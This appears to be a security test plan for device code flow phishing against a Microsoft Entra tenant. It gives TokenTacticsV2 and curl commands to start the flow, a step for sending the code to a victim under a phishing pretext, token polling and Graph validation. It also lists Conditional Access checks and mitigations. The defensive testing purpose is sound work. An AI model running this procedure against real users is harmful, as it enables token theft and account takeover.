# 02 - Device Code Flow Phishing Test

## What this tests

Microsoft's device code flow is designed for input-constrained devices. An attacker initiates the flow, gets a `user_code`, and tricks the victim into entering it at the real `microsoft.com/devicelogin` page. The victim authenticates **legitimately** — no rogue domain, no proxy. The attacker receives tokens for whatever scope was requested.

Key question this test answers: **does the CA "Authentication Flows" policy actually block this in your tenant, or does it slip through?**

## Recommended tool

**TokenTacticsV2** — actively maintained PowerShell module specifically built for this kind of testing.
- Repo: https://github.com/f-bader/TokenTacticsV2
- Relevant cmdlet: `Invoke-DeviceCodeFlow`, then `Get-AzureToken`, `Get-AzureRefreshTokenFromCache`

Install:
```powershell
Install-Module TokenTacticsV2 -Scope CurrentUser
# Or clone and import for the latest changes
```

## Test procedure

### 1. Initiate the flow from attacker box

```powershell
Import-Module TokenTacticsV2

# Pick a well-known first-party client. The Azure PowerShell client ID
# (1b730954-1685-4b74-9bfd-dac224a7b894) returns broad-scope tokens.
Invoke-DeviceCodeFlow -Client AzurePowerShell -Resource MSGraph
```

The cmdlet prints a `user_code` (e.g., `BVCSDXNM3`) and the verification URL.

If you prefer raw HTTP (no module dependency):
```bash
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/devicecode" \
  -d "client_id=1b730954-1685-4b74-9bfd-dac224a7b894" \
  -d "scope=https://graph.microsoft.com/.default offline_access"
```

### 2. Deliver to victim

Send the `user_code` + `microsoft.com/devicelogin` URL via whatever phishing pretext fits your test plan. The user enters the code on the real Microsoft page.

**Note on timing:** the code expires (~15 min default). Plan delivery accordingly.

### 3. Capture tokens

TokenTacticsV2 polls automatically. Raw curl version:
```bash
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
  -d "client_id=1b730954-1685-4b74-9bfd-dac224a7b894" \
  -d "device_code=<DEVICE_CODE_FROM_STEP_1>"
```

### 4. Validate token works

```powershell
$headers = @{Authorization = "Bearer $($tokens.access_token)"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
```

## What to check after

| Question | How to validate |
|---|---|
| Did Conditional Access block this? | Check sign-in logs filtered by `AuthenticationProtocol == "deviceCode"` |
| Did CA "Authentication Flows" block work? | Should be a "Block" result. If success, the policy isn't catching this flow. |
| Did compliant device requirement block? | The attacker IP is unmanaged — CA result should reflect that |
| Did CAE strict location revoke quickly? | Watch sign-in logs from the attacker IP; token should die in <5 min if configured |
| Did Identity Protection flag risk? | Risky sign-ins view in Entra |
| Did the alert fire in Defender XDR? | Run KQL from `05-detection/02-device-code.kql` |

## Variations to test

- Request a different scope: `https://management.core.windows.net/.default` (Azure ARM)
- Use a different first-party client to see if scope/audience changes the CA behavior
- Run with the victim physically on the corporate network — does it still succeed?

## Closing the gap

Conditional Access policy:
- Target: All users (or scoped pilot)
- Conditions → Authentication Flows → Device code flow → **Block**
- Exception: any service account that legitimately needs device code (rare)
